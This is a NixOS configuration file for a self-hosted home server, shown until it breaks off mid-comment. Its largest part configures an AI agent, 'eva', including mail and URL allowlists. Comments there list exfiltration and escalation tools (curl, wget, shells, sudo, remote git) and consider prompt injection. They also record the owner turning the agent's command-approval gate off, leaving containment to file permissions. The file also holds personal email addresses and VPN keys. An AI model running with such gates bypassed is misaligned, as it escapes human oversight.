# Edit this configuration file to define what should be installed on
# your system. Help is available in the configuration.nix(5) man page, on
# https://search.nixos.org/options and in the NixOS manual (`nixos-help`).
{
  self,
  nixpkgs,
  nixpkgs-unstable,
  home-manager,
  sops-nix,
  emacs-overlay,
  ...
}:

let

  homeServerLocalAddress = "192.168.2.2";
  adminEmailAddress = "admin@acpuchades.com";
  privateNetworks = [ "192.168.2.0/24" "10.0.0.0/24" ];

  # The owner's own addresses eva may email without a per-send approval. Defined
  # ONCE and shared by BOTH outbound mail wrappers so the two lists can never
  # drift apart: send-trusted-mail (actions.trustedMail.trustedAddresses, which
  # self-gates and hard-refuses anything else) and send-email
  # (my.openclaw.mail.unpromptedRecipients, whose exec-allowlist rules let these
  # send unprompted while any other recipient falls through to the approval gate).
  evaTrustedMailRecipients = [
    "acaravaca@bellvitgehospital.cat"
    "acaravaca@idibell.cat"
    "acp1337@proton.me"
    "acaravacapuchades@gmail.com"
    "acaravacapuchades@uoc.edu"
    "acaravpu55@alumnes.ub.edu"
  ];

  configuration =
    inputs@{ config, options, lib, pkgs, ... }:
    {
      imports = [
        # Include the results of the hardware scan.
        ./hardware-configuration.nix

        # Host settings, imported as a module so it merges with full option
        # semantics. It used to be `import ./settings.nix inputs // { ... }`,
        # but that shallow `//` silently dropped any top-level key settings.nix
        # shared with the inline set — notably `services` (losing the journald
        # SystemMaxUse cap) and `security` (masking the sudo setting).
        ./settings.nix
        ./services.nix
        ./networking.nix
        ./sops.nix
        ./users.nix

        # Host-specific policy routing: ProtonVPN egress for wg0 clients.
        # DISABLED 2026-06-02: wg0 clients reached the LAN but had no usable
        # internet through the nested wgproton tunnel. TWO distinct faults:
        #   (a) PMTU black-holing — the 1340 tunnel dropped clients' large
        #       TCP/QUIC packets (a "need to frag (mtu 1340)" flood). Lowering
        #       the client profile MTU to 1280 (tried on alex-laptop) DID stop
        #       the flood — so this part is understood/fixable.
        #   (b) UNRESOLVED: even with (a) fixed, FORWARDED client traffic
        #       (masqueraded to 10.2.0.2) still gets NO replies back from Proton,
        #       while server-sourced egress (also 10.2.0.2, but OUTPUT path) AND
        #       the gateway's own 10.2.0.1<->10.2.0.2 ICMP ping-pong both work.
        #       The tunnel is healthy; only relayed/forwarded flows black-hole on
        #       the return leg. Root cause not found (needs an outer-path capture
        #       on wlp3s0 to see if forwarded encrypted pkts reach Proton / if
        #       encrypted replies come back).
        # Disabled so wg0 clients egress directly via the ISP (vpn-server's NAT,
        # no kill switch, real ISP IP). Re-enabling needs (b) solved, not just
        # the MTU. (sops secret left in place.)
        # ./vpn-egress.nix

        # Host-specific egress confinement + NAT-PMP for the transmission daemon.
        # DISABLED 2026-05-30: ProtonVPN port forwarding (NAT-PMP) is not serviced
        # for this account on its servers — the request egresses fine but Proton
        # never replies, so the BT tunnel gets no inbound peer port. Re-enable this
        # together with the wgproton-bt interface and my.transmission-server below
        # once port forwarding works. (sops secrets are intentionally left in place.)
        # ./transmission-egress.nix

        # Custom modules
        ../../modules/vpn-server
        ../../modules/wireguard-client
        ../../modules/transmission-server
        ../../modules/dns-filtering
        ../../modules/web-server
        ../../modules/postgresql-server
        ../../modules/cloud-suite
        ../../modules/samba-server
        ../../modules/media-server
        ../../modules/print-server
        ../../modules/gps-backend
        ../../modules/geocoding
        ../../modules/openclaw
        ../../modules/tor-bridge
        ../../modules/push-notifications
        ../../modules/mail-server
        ../../modules/prefect-server
        ../../modules/home-assistant
        ../../modules/server-stats
        ../../modules/web-analytics
        ../../modules/service-dashboard
        ../../modules/acme-cloudflare
        ../../modules/host-security
        ../../modules/ups-monitor
      ];

      systemd.network.networks = {
        "10-wlp3s0" = {
          matchConfig.Name = "wlp3s0";
          # Static LAN IP. The server's identity (192.168.2.2) is hardcoded
          # across AdGuard rewrites, the *.acpuchades.com vhosts,
          # homeServerLocalAddress and the router's 51820 port-forward, so it
          # must not float on DHCP (a lease change took the server down once).
          # Make sure 192.168.2.2 is outside the router's DHCP pool to avoid a
          # collision with a dynamically-assigned client.
          address = [ "192.168.2.2/24" ];
          gateway = [ "192.168.2.1" ];
          networkConfig = {
            DHCP = "no";
            DNS = [ "127.0.0.1" ];
          };
        };
      };

      # ddclient is driven by a sops configFile, which bypasses the NixOS
      # module's auto-injected cache= path — without this it falls back to a
      # directory inside the read-only Nix store. CacheDirectory provisions
      # /var/cache/ddclient (cache= in sops.nix points there).
      systemd.services.ddclient.serviceConfig.CacheDirectory = "ddclient";

      security.tpm2.enable = true;
      security.tpm2.pkcs11.enable = true;
      security.tpm2.tctiEnvironment.enable = true;

      environment.etc."crypttab".text = ''
        srv-encrypted /dev/disk/by-uuid/c5e7c042-5625-493f-9b8a-487ecdac277a - /tpm2-device=auto,discard
      '';

      # List packages installed in system profile.
      # You can use https://search.nixos.org/ to find more packages (and options).
      environment.systemPackages = import ./packages.nix inputs;

      # Configure custom modules
      my.acme-cloudflare = {
        enable = true;
        credentialsFile = config.sops.templates."caddy/cloudflare-env".path;
      };

      my.vpn-server = {
        enable = true;
        privateKeyFile = config.sops.secrets."wireguard/private-key".path;
        serverPublicKey = "dnwEk7CRGfzDFJruRiCzmGNURU6Ba/OLUDpQ5ImO7G4=";
        serverEndpoint = "vpn.acpuchades.com:51820";
        clientDns = "10.0.0.1";
        upstreamInterface = "wlp3s0";
        peers = {
          alex-laptop = {
            publicKey = "96LNh5CjJQZuWpqquXlmc9cNU5sJzalzKcTcnMhqWSI=";
            allowedIPs = [ "10.0.0.2/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/alex-laptop".path;
          };
          alex-ipad = {
            publicKey = "qek70rKtZ2KpDk5JvEJrc3HDP9E0i+uwyv8BJpFi4GQ=";
            allowedIPs = [ "10.0.0.3/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/alex-ipad".path;
          };
          alex-phone-owner = {
            publicKey = "jzXucrFLPLL0og1QXP75R+oYUyTqNCRnD6gw3SMPI0M=";
            allowedIPs = [ "10.0.0.4/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/alex-phone-owner".path;
          };
          alex-phone-personal = {
            publicKey = "ayIoJHS1QIvbyixoVTRMuDB+RMoh6N7mgscfP7RY7wY=";
            allowedIPs = [ "10.0.0.5/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/alex-phone-personal".path;
          };
          alex-phone-work = {
            publicKey = "r/0vQN5JOLlWWOBwIi9SRJj8F06FrMP9xywO+PMs6Rc=";
            allowedIPs = [ "10.0.0.6/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/alex-phone-work".path;
          };
          mubin-laptop-personal = {
            publicKey = "Wk0VWDe0KNjrG8fDDTfFXpuNfZ8BNxLxhYiF1LFyCA4=";
            allowedIPs = [ "10.0.0.10/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/mubin-laptop-personal".path;
          };
          mubin-laptop-work = {
            publicKey = "3jUISZl3AQAScASjxNnoGPvayi1/3jbLUzVS+6Kzfmo=";
            allowedIPs = [ "10.0.0.11/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/mubin-laptop-work".path;
          };
          mubin-phone-personal = {
            publicKey = "y5XFrY1BT+lG25DM+0se9GBTiGcAv69Ag2twUbcWugE=";
            allowedIPs = [ "10.0.0.12/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/mubin-phone-personal".path;
          };
          mubin-phone-work = {
            publicKey = "efhtt7/eRYIvoyda7u+0GUA7y6WOxZtbPjIUNwdOsF4=";
            allowedIPs = [ "10.0.0.13/32" ];
            presharedKeyFile = config.sops.secrets."wireguard/psk/mubin-phone-work".path;
          };
        };
      };

      # ProtonVPN egress tunnel (ES#95). Installs its default route into a
      # dedicated table (42, not main), so bringing it up never touches the
      # host's default route; machines/homeserver/vpn-egress.nix steers the
      # 10.0.0.0/24 client subnet into that table with a kill switch. DNS
      # (10.2.0.1) from the profile is intentionally ignored; resolution stays
      # on AdGuard Home.
      my.wireguard-client = {
        enable = true;
        # DISABLED 2026-06-02 together with ./vpn-egress.nix above: forwarded
        # wg0-client egress through this tunnel got no replies from Proton (full
        # reasoning on the import comment — MTU was only part of it). With egress
        # steering gone the tunnel would just sit up unused, so it's disabled too.
        # Re-enabling needs the forwarded-no-reply issue solved, not just the MTU.
        # interfaces.wgproton = {
        #   privateKeyFile = config.sops.secrets."wireguard-client/wgproton".path;
        #   address = [ "10.2.0.2/32" "2a07:b944::2:2/128" ];
        #   allowedIPsAsRoutes = true;
        #   table = "42";
        #   mtu = 1340; # nested inside wg0 — lower MTU avoids PMTU black-holing
        #   peer = {
        #     publicKey = "tEz96jcHEtBtZOmwMK7Derw0AOih8usKFM+n4Svhr1E=";
        #     endpoint = "130.195.250.66:51820";
        #     allowedIPs = [ "0.0.0.0/0" ]; # IPv4 only; wg0 clients have no IPv6, avoids a dead ::/0 route
        #   };
        # };

        # Second ProtonVPN tunnel, dedicated to the transmission daemon so its
        # BitTorrent traffic exits on a separate IP with NAT-PMP port forwarding.
        # Proton hands every config the same 10.2.0.2/32 address; that's fine here
        # because the route lives in its own table (43, not main), exactly like
        # wgproton/table 42 — the duplicate interface address never reaches the
        # main table. IPv4-only (table 43 carries no v6 route); the IPv6 address
        # is omitted since it would be unused. Confinement + kill switch + NAT-PMP
        # are in machines/homeserver/transmission-egress.nix.
        #
        # DISABLED 2026-05-30: Proton port forwarding isn't serviced for this
        # account (NAT-PMP never replies), so this tunnel has no purpose for now.
        # Re-enable with ./transmission-egress.nix and my.transmission-server.
        # interfaces.wgproton-bt = {
        #   privateKeyFile = config.sops.secrets."wireguard-client/wgproton-bt".path;
        #   address = [ "10.2.0.2/32" ];
        #   allowedIPsAsRoutes = true;
        #   table = "43";
        #   mtu = 1340; # nested inside wg0 — lower MTU avoids PMTU black-holing
        #   peer = {
        #     publicKey = "XkiKln3Se1dUvLL9s803TbYkfFNJtb051iGcGs1jgSk=";  # ES#124
        #     endpoint = "130.195.250.98:51820";
        #     allowedIPs = [ "0.0.0.0/0" ];
        #   };
        # };
      };

      # NOTE 2026-05-31: enabled WITHOUT VPN egress confinement for now — the
      # wgproton-bt tunnel and ./transmission-egress.nix (kill switch + NAT-PMP)
      # above stay disabled until Proton port forwarding works. So the daemon
      # currently egresses via the default route (real ISP IP, no kill switch)
      # and has no inbound peer port (peer-port stays at its placeholder, LAN
      # firewall closed). Re-enable wgproton-bt + transmission-egress to confine it.
      my.transmission-server = {
        enable = true;
        hostName = "torrent.acpuchades.com";
        downloadDir = "/srv/shared/Downloads";
        allowedNetworks = privateNetworks;
        basicAuthFile = config.sops.templates."caddy/torrent-auth".path;
        # Bumped above the module defaults (8000/1500 full, 2000/500 turtle) so
        # slow torrents aren't ceilinged — schedule unchanged (turtle 08:00–23:00,
        # full speed overnight). A cap is a ceiling not a floor: this only helps
        # torrents that actually have the peers to saturate it.
        maxDownKBps = 15000; # ~120 Mbit/s full speed (overnight 23:00–08:00)
        maxUpKBps = 2500;
        altDownKBps = 4000;  # ~32 Mbit/s turtle (active 08:00–23:00)
        altUpKBps = 1000;
      };

      # TEMPORARY 2026-05-31: open the BitTorrent peer port (TCP+UDP 51413) on the
      # host firewall so a router port-forward to this machine reaches the daemon.
      # The module forces this off (openPeerPorts = false) on the assumption the
      # peer port lives on the wgproton-bt tunnel; with that tunnel disabled the
      # port has to be opened on the LAN firewall instead. Forward TCP+UDP 51413
      # on the router → 192.168.2.2. REVERT this when wgproton-bt + transmission-
      # egress come back (the tunnel's NAT-PMP supplies the inbound port instead).
      services.transmission.openPeerPorts = lib.mkForce true;

      my.dns-filtering = {
        enable = true;
        adguardPort = 3000;
        dnsPort = 53;
        dnsResolverPort = 5300;
        basicAuthFile = config.sops.templates."caddy/adguard-auth".path;
        virtualHost = "adguard.acpuchades.com";
        allowedNetworks = privateNetworks;
        dnsRewrites = [
          # vpn.acpuchades.com is intentionally NOT rewritten here: it must
          # always resolve to the public IP (via DDNS) so the WireGuard endpoint
          # stays reachable. The router handles NAT hairpin for on-LAN clients,
          # which avoids the split-horizon blip a global AdGuard rewrite caused
          # for remote clients re-resolving the endpoint through the tunnel when
          # switching networks while connected.
          { domain = "acpuchades.com";           answer = homeServerLocalAddress; }
          { domain = "www.acpuchades.com";       answer = homeServerLocalAddress; }
          { domain = "blog.acpuchades.com";      answer = homeServerLocalAddress; }
          { domain = "home.acpuchades.com";      answer = homeServerLocalAddress; }
          { domain = "adguard.acpuchades.com";   answer = homeServerLocalAddress; }
          { domain = "bitwarden.acpuchades.com"; answer = homeServerLocalAddress; }
          { domain = "photos.acpuchades.com";    answer = homeServerLocalAddress; }
          { domain = "media.acpuchades.com";     answer = homeServerLocalAddress; }
          { domain = "cloud.acpuchades.com";     answer = homeServerLocalAddress; }
          { domain = "collabora.acpuchades.com"; answer = homeServerLocalAddress; }
          { domain = "gps.acpuchades.com";       answer = homeServerLocalAddress; }
          { domain = "prefect.acpuchades.com";   answer = homeServerLocalAddress; }
          { domain = "status.acpuchades.com";    answer = homeServerLocalAddress; }
          { domain = "analytics.acpuchades.com"; answer = homeServerLocalAddress; }
          { domain = "dashboard.acpuchades.com"; answer = homeServerLocalAddress; }
          { domain = "torrent.acpuchades.com";   answer = homeServerLocalAddress; }
          { domain = "nominatim.acpuchades.com"; answer = homeServerLocalAddress; }
          # ntfy is reachable from off-LAN by design; this rewrite only affects
          # clients resolving through AdGuard, and just saves them a NAT hairpin.
          { domain = "ntfy.acpuchades.com";      answer = homeServerLocalAddress; }
        ];
      };

      my.web-server = {
        enable = true;
        adminEmail = adminEmailAddress;
        virtualHosts = {
          "acpuchades.com" = {
            redirect = "https://www.acpuchades.com";
          };
          "www.acpuchades.com" = {
            root = "/var/www/acpuchades.com";
          };
          "blog.acpuchades.com" = {
            redirect = "https://www.acpuchades.com/blog";
          };
        };
      };

      my.postgresql-server = {
        enable = true;
        dataDir = "/srv/encrypted/postgresql";
      };

      my.cloud-suite = {
        enable = true;
        bitwarden = {
          hostName = "bitwarden.acpuchades.com";
          signupsAllowed = false;
          dataDir = "/srv/encrypted/vaultwarden";
          allowedNetworks = privateNetworks;
        };
        collabora = {
          hostName = "collabora.acpuchades.com";
          port = 9980;
        };
        email = {
          from = "noreply@acpuchades.com";
        };
        immich = {
          hostName = "photos.acpuchades.com";
          mediaLocation = "/srv/encrypted/immich";
          accelerationDevices = [ "/dev/dri/renderD128" ];
        };
        nextcloud = {
          hostName = "cloud.acpuchades.com";
          adminPasswordFile = config.sops.secrets."nextcloud/admin".path;
          maxUploadSize = "2G";
          phoneRegion = "ES";
          dataDir = "/srv/encrypted/nextcloud";
          allowedNetworks = privateNetworks;
          extraApps = [
            "bookmarks" "calendar" "contacts" "gpoddersync" "groupfolders"
            "news" "nextpod" "notes" "richdocuments" "tasks"
          ];
        };
      };

      my.samba-server = {
        enable = true;
        group = "share";
        users = {
          alex = config.sops.secrets."samba/alex".path;
        };
        allowedNetworks = privateNetworks;
        shares = {
          shared = {
            path = "/srv/shared";
            comment = "Home server files";
            "read only" = false;
            # Anyone in the `share` group may read/write; new files land in the
            # group group-writable so other members can edit them too.
            "valid users" = "@share";
            "write list" = "@share";
            "force group" = "share";
            "create mask" = "0664";
            "force create mode" = "0660";
            "directory mask" = "2770";
            "force directory mode" = "2770";
          };
        };
      };

      my.media-server = {
        enable = true;
        hostName = "media.acpuchades.com";
        # Libraries live inside the Samba share so media dropped over SMB is
        # readable by Jellyfin; shareGroup = "share" makes jellyfin join the
        # group and provisions the folders root:share 2770 (matching the share).
        mediaDir = "/srv/shared/Media";
        libraries = [ "Movies" "Shows" "Music" ];
        shareGroup = "share";
        # Internal hosts only — Caddy restricts the vhost to the LAN/VPN subnets.
        allowedNetworks = privateNetworks;
        # Same GPU render node Immich uses; enable the codecs in Jellyfin's UI.
        accelerationDevices = [ "/dev/dri/renderD128" ];
      };

      my.print-server = {
        enable = true;
        allowedNetworks = privateNetworks;
        # Driverless printers (IPP Everywhere / AirPrint) need no driver package.
        drivers = [];
      };

      my.gps-backend = {
        enable = true;
        hostName = "gps.acpuchades.com";
        email.from = "noreply@acpuchades.com";
        # Reverse-geocode positions with the self-hosted Nominatim (my.geocoding
        # below), over its loopback nginx port. Traccar turns fixes into
        # addresses without hitting the public OSM endpoint.
        geocoder.url = "http://127.0.0.1:${toString config.my.geocoding.port}/reverse";
      };

      # Nominatim. Kept LAN/WireGuard-only: a public geocoding endpoint is a
      # scraper magnet, and the only consumers here are Traccar and Home
      # Assistant. See the module header — enabling this creates an EMPTY
      # database; the Spain extract has to be imported by hand once.
      my.geocoding = {
        enable = true;
        hostName = "nominatim.acpuchades.com";
        allowedNetworks = privateNetworks;
        # Keep the database off /srv/encrypted: that is a spinning disk, and
        # Nominatim is dominated by random index reads. /var/lib is on the ext4
        # NVMe root, which also sidesteps the btrfs CoW + zstd penalty the rest
        # of the cluster pays. A Spain extract needs ~15-20 GB of the 386 GB
        # free there.
        tablespace.enable = true;
        updates = {
          enable = true;
          # Must match the extract imported by hand (spain-latest.osm.pbf).
          replicationUrl = "https://download.geofabrik.de/europe/spain-updates/";
        };
      };

      # ntfy. Deliberately NOT restricted to privateNetworks — a push server
      # that only works on the LAN is pointless. Auth is deny-all instead, so
      # users/tokens must be created with the CLI before anything can publish
      # or subscribe. See the module header.
      my.push-notifications = {
        enable = true;
        hostName = "ntfy.acpuchades.com";
      };

      # OpenClaw agent — Telegram-only, loopback gateway, but NOT confined on
      # the host side (no sandbox/grants; see the module header).
      # Needs the two SOPS secrets below populated (declared in sops.nix):
      #   sops machines/homeserver/secrets/default.yml
      #     openclaw/telegram-token, openclaw/telegram-userid
      # Auth is the Claude subscription via the Claude CLI runtime — log in once:
      #   sudo -u eva -H claude            # /login, then quit
      my.openclaw = {
        enable = true;
        # The bot is eva_lebbot, so she gets a real account here: /home/eva,
        # her own workspace.
        user = "eva";

        # OpenClaw from nixpkgs-unstable (2026.6.33), NOT nixpkgs-26.05's 2026.5.7.
        # Why: 2026.5.7's claude-cli runtime has no handler for Claude Code's
        # permission protocol (control_request/can_use_tool), so a non-allowlisted
        # command hangs ~180s then dies with no Telegram prompt. 2026.6.33 adds the
        # responder (claude-live-session answers can_use_tool → allow under YOLO
        # else a clean deny) AND fixes the bundled-surface hardlink guard upstream
        # (plugin loaders now pass rejectHardlinks:false), which is what our
        # openclawPatched workaround exists to paper over. A separate unstable pkgs
        # instance is imported with an openclaw-only insecure permit (openclaw is
        # marked knownVulnerabilities upstream); the predicate is version-agnostic
        # so it survives unstable's openclaw bumps without editing a version string.
        package = (import nixpkgs-unstable {
          inherit (pkgs.stdenv.hostPlatform) system;
          config.allowInsecurePredicate = p: (pkgs.lib.getName p) == "openclaw";
        }).openclaw;

        # Execution backend: the "claude-cli" runtime, which reuses a Claude Code
        # subscription login on this host (`claude -p`) so the flat subscription
        # pays instead of per-token API spend — switched back 2026-07-27 to cut
        # the API bill the native runtime was running up.
        #
        # KNOWN TRADEOFF (see the openclaw-execperms notes): under claude-cli,
        # OpenClaw delegates command execution to a Claude Code subprocess, so its
        # OWN exec-approval gate (everything under tools.exec + channels.telegram.
        # execApprovals below) is INERT — those keys configure OpenClaw's in-process
        # exec tool, which this runtime never uses. Net interim behavior with the
        # current allowlist+on-miss config: allowlisted / read-only commands run
        # fine, but a NON-allowlisted command has no approval path — Claude Code
        # waits on a stdio permission prompt OpenClaw can't answer, so the turn
        # HANGS ~180s then dies ("Something went wrong"). Nothing unsafe RUNS (it's
        # effectively fail-closed), the UX is just bad. The deliberate posture
        # (YOLO bypassPermissions = subscription + no gate but unsafe, vs a proper
        # fail-closed path via the acpx ACP bridge) is STILL TBD — decide later.
        #
        # REQUIRES a valid Claude login for the eva user, or she can't auth at all:
        #   sudo -u eva -H claude          # /login, then quit
        #   systemctl restart openclaw
        # And ANTHROPIC_API_KEY must NOT be in the service env, or Claude Code
        # prefers the API key and bills per-token anyway — so openclaw/anthropic-env
        # is dropped from environmentFiles below.
        #
        # Scalar note: the ExecStartPre seed applies this template with
        # `openclaw config patch` (recursive MERGE — objects merge, scalars
        # replace, null deletes). The live config currently holds
        # agents.defaults.agentRuntime.id = "pi"; emitting "claude-cli" here
        # REPLACES that scalar cleanly. (A literal null would only OMIT the key and
        # the merge would keep "pi" forever — so set the string explicitly.)
        agentRuntime = "claude-cli";

        # The module is secret-system agnostic and takes runtime FILES; on this
        # host they are the sops-nix secret paths. The token/ID values live only
        # in the encrypted secrets file, never in this public repo or the store.
        telegram.tokenFile = config.sops.secrets."openclaw/telegram-token".path;
        telegram.allowedIdFile = config.sops.secrets."openclaw/telegram-userid".path;

        # Sonnet 4.6 primary. Haiku 4.5 was tried as the everyday tier to shave
        # the API bill, but it is too weak for eva's tool-using turns, so the
        # primary is back on Sonnet — the cheapest tier that actually holds up
        # for her workload. Delegated *subagents* also run on Sonnet (see
        # subagents.model below), so heavy delegated work stays on the same tier.
        # No model failover. A Gemini Flash fallback lived here for Claude
        # usage-cap outages, but the key's Google project never had Generative-
        # Language-API access to gemini-2.5-flash (persistent 404s), so in
        # practice it only turned transient Claude timeouts into Gemini 404 error
        # replies. Dropped 2026-07-26; when Claude fails, eva now surfaces the
        # Claude error instead of bouncing onto a broken fallback. Re-add via
        # fallbackModels + the openclaw/gemini-env secret if a working
        # key/project is ever provisioned.
        model = "anthropic/claude-sonnet-4-6";
        fallbackModels = [ ];
        settings.agents.defaults.subagents.model = "anthropic/claude-sonnet-4-6";

        # Memory-search embeddings: a LOCAL, keyless embedder. openclaw's default
        # embedding provider is "openai" (needs an OPENAI_API_KEY we do not put on
        # the box — `openclaw memory index` failed "No API key found for provider
        # openai"), and Anthropic has no embeddings API so the subscription doesn't
        # help. "local" runs a GGUF on-box via node-llama-cpp: no key, no per-token
        # cost, memory text stays on the host. The GGUF is supplied here (not baked
        # into the module), same as stt.model — nomic-embed-text v1.5 Q4_K_M is
        # ~84MB and CPU-friendly; swap url+hash for a multilingual model if Spanish
        # recall needs it. After deploy, (re)index as eva with the service env:
        #   sudo -u eva env HOME=/home/eva OPENCLAW_STATE_DIR=/var/lib/openclaw \
        #     OPENCLAW_CONFIG_PATH=/var/lib/openclaw/openclaw.json \
        #     openclaw memory index --force --verbose
        memorySearch = {
          enable = true;
          provider = "local";
          localModelPath = pkgs.fetchurl {
            url = "https://huggingface.co/nomic-ai/nomic-embed-text-v1.5-GGUF/resolve/main/nomic-embed-text-v1.5.Q4_K_M.gguf";
            hash = "sha256-1OOIiU4JzzgW6LCJbYHSZbVeep//mrA/6L9O9eESlaw=";
          };
        };

        # Heartbeat: eva takes an autonomous turn every 2h, but only during
        # waking hours (08:00–22:00 Europe/Madrid, matching the host timezone) so
        # she doesn't ping overnight. Driven by the module's first-class options
        # (the every/activeHours defaults already match this; timezone is set
        # explicitly so the window is local wall-clock, not the process TZ).
        heartbeat = {
          enable = true;
          every = "2h";
          activeHours = {
            start = "08:00";
            end = "22:00";
            timezone = "Europe/Madrid";
          };
        };

        # Extra tooling eva can invoke by name (the module puts each on the
        # service PATH and in the system profile). Being reachable is separate
        # from being unprompted; whether a run needs approval is
        # decided by the exec allowlist below. ffmpeg/pandoc/xmllint are ALSO
        # pre-blessed there (run unprompted); imagemagick and the python3/R
        # interpreters are NOT — an actual invocation of those still raises the
        # inline Telegram approval prompt. Kept here (not in the module) so the
        # module stays deployment-agnostic. python3/R carry the packages she needs
        # baked in, so `import requests` / `library(tidyverse)` resolve without a
        # network fetch or a writable site-library.
        extraPackages = with pkgs; [
          ffmpeg # full ffmpeg (STT already pulls ffmpeg-headless; this adds codecs)
          imagemagick # `convert`/`magick` image manipulation
          libxml2.bin # `xmllint` (lives in the .bin output, not the default one)
          pandoc # document conversion
          (python3.withPackages (ps: with ps; [
            requests
            icalendar
            vobject
            python-dateutil
            lxml
          ]))
          (rWrapper.override { packages = [ rPackages.tidyverse ]; })
        ];

        # Eva's email: read her Maildir + a recipient-gated send-email helper.
        # These addresses (all the owner's own) send with no approval; every
        # other recipient falls through to the Telegram gate. The module generates
        # the send-email wrapper, read-only tools, allowlist rules and the skill.
        # manageMaildir lets her organise her OWN mailbox unprompted (flag/refile/
        # mkdir/incorporate/deliver) — local Maildir mutation only; sending still
        # goes through the recipient-gated send-email path.
        mail = {
          enable = true;
          manageMaildir = true;
          fromAddress = "e.lebbot@acpuchades.com";
          # Shared with send-trusted-mail (see evaTrustedMailRecipients) so the
          # two outbound wrappers never drift. These send unprompted; any other
          # recipient falls through to the approval gate.
          unpromptedRecipients = evaTrustedMailRecipients;
        };

        # Sanctioned self-gating action wrappers (see my.openclaw.actions). These
        # are eva's ONLY unprompted outbound paths: request-trusted-url can GET/
        # HEAD only *.acpuchades.com, and send-trusted-mail can only reach the
        # trusted addresses below. Raw curl/wget/sendmail stay gated, and the
        # policy skill tells eva to reach for these wrappers first.
        actions = {
          requestUrl = {
            enable = true;
            # EXACT calendar hosts (never *.google.com etc.) so eva can fetch .ics
            # feeds via `request-trusted-url <url> | parse-ics` without also opening
            # the provider's other endpoints (Forms, Analytics, proxies). GET-only +
            # --max-redirs 0 already, so an exact calendar host is not an exfil path.
            # Nextcloud is already covered by *.acpuchades.com.
            trustedSites = [
              "*.acpuchades.com"
              "generativelanguage.googleapis.com"
              "calendar.google.com" # Google Calendar .ics export
              "*.caldav.icloud.com" # Apple iCloud (this subdomain only serves CalDAV)
              "outlook.office365.com" # Microsoft 365 published calendars
              "outlook.live.com" # Outlook.com published calendars
            ];
          };
          trustedMail = {
            enable = true;
            trustedAddresses = evaTrustedMailRecipients;
          };
          # Image generation via Gemini (uses eva's avatar as a subject/style
          # reference). The API key is a runtime file eva owns; the model,
          # reference image and endpoint are pinned by nix. This is why
          # generativelanguage.googleapis.com is a trusted site above — though
          # note generate-image uses raw curl (POST), not request-trusted-url.
          generateImage = {
            enable = true;
            model = "gemini-2.5-flash-image";
            # Gemini API key from sops-nix (eva-readable secret), not a plain file.
            tokenFile = config.sops.secrets."google/gemini-token".path;
            # Default reference (her avatar), overridable per call with --reference
            # or dropped with --no-reference; prompt-only also works. Runtime
            # references are confined to her workspace so an arbitrary file can't be
            # base64'd to the endpoint.
            referenceImage = "/home/eva/workspace/avatars/eva_lebbot.png";
            referenceRoot = "/home/eva/workspace";
          };
          # Current weather via OpenWeatherMap. API key from sops-nix (eva-readable
          # secret), read at runtime by the check-weather wrapper. lang=es for
          # localized descriptions; add defaultLocation = "City,CC" for a default.
          checkWeather = {
            enable = true;
            tokenFile = config.sops.secrets."openweather/token".path;
            lang = "es";
          };
          # Offline .ics summarizer. eva reads calendars with
          # `request-trusted-url <ics-url> | parse-ics --days 14` (the provider
          # hosts are trusted sites above); parse-ics itself never touches the net.
          parseIcs.enable = true;
        };

        # Exec policy: allowlist + confirm-on-miss, via the module's first-class
        # options (pinned every start, so eva can't self-escalate at runtime).
        # Only allowlisted commands run unprompted; anything else raises an
        # approval request in the origin Telegram DM, answered inline.
        #
        # safeBins is the pre-blessed set: the module's read-only default PLUS the
        # observe-only system/text tools AND the local filesystem mutators below
        # (blessed because eva's WRITE surface is confined by permissions to her
        # own tree + acpuchades-site — see access above). Deliberately NOT pre-
        # blessed, so they keep prompting: the escalation/exfil vectors — sudo,
        # the shells/interpreters and inline-eval, the exec-wrappers (env/timeout/
        # tee/xargs), sed/awk in-place, find -exec/-delete (guarded), the network
        # tools (curl/wget — use the request-trusted-url wrapper instead), and
        # every REMOTE git verb (push/pull/fetch/clone). eva widens coverage for a
        # SPECIFIC invocation at runtime without a rebuild via `openclaw approvals
        # allowlist add "<glob>"` — per-agent state, not re-seeded here.
        exec = {
          # YOLO (security=full + ask=off). NOT a posture we'd pick, but the only
          # one that FUNCTIONS: under the claude-cli runtime OpenClaw cannot gate
          # Claude's native Bash per-command — its permission handler is BLANKET
          # (allow iff full+off, else deny) and never consults safeBins/allowlist.
          # So "allowlist"+"on-miss" denied EVERY command (eva couldn't even write
          # her own memories — completely unusable). full+off makes OpenClaw launch
          # Claude with --permission-mode=bypassPermissions, so commands actually
          # run. The exec gate is thus effectively OFF; eva's containment now rests
          # on OTHER layers: filesystem permissions (her writable surface is
          # confined to her own tree + /tmp + acpuchades-site — NOT /home/alex, NOT
          # the system), no passwordless sudo beyond `sudoCommands`, and (TODO)
          # network-egress limits. The native runtime — where the gate genuinely
          # works — is permanently off the table on cost. The safeBins/allowlist
          # below are kept (harmless, and correct if the runtime ever changes) but
          # are INERT under claude-cli. See the openclaw-execperms notes.
          security = "full";
          ask = "off";
          strictInlineEval = true;
          safeBins = options.my.openclaw.exec.safeBins.default ++ [
            # Process / system / network INSPECTION (read-only; their mutating
            # subcommands need root, which a bare non-sudo invocation lacks).
            "ps" "pgrep" "pstree" "lsof" "ss" "ip" "journalctl" "w" "who"
            "vmstat" "iostat" "mpstat" "lscpu" "lsblk" "lsmem" "lsusb" "lspci"
            "nproc" "arch" "getent" "locale" "tty" "cal"
            # More read-only text/data shaping (stdin/args -> stdout; no writes,
            # no exec, no network).
            "tac" "tr" "rev" "fold" "fmt" "expand" "unexpand" "paste" "join"
            "printf" "seq" "expr" "test" "namei" "pathchk"
            "sha1sum" "sha512sum" "b2sum" "base64" "base32"
            "xxd" "hexdump" "od" "strings"
            # Filesystem MUTATION, blessed to run unprompted. This is safe ONLY
            # because eva's writable surface is confined by permissions to her OWN
            # tree, world-writable /tmp, and the single git-backed acpuchades-site
            # repo (see `access` above — no nix-config, no /home/alex): the worst
            # an injected prompt can do with these is trash eva's own disposable
            # state/mailbox or the site working tree (recoverable from git), never
            # the flake, the system config, or anything off-box. chown/chgrp are
            # near-no-ops
            # for a non-root single-group user (can't give files away). The real
            # escalation/exfil vectors are DELIBERATELY absent and still gated:
            # sudo, the shells/interpreters (bash/sh/python/R/node/perl), the
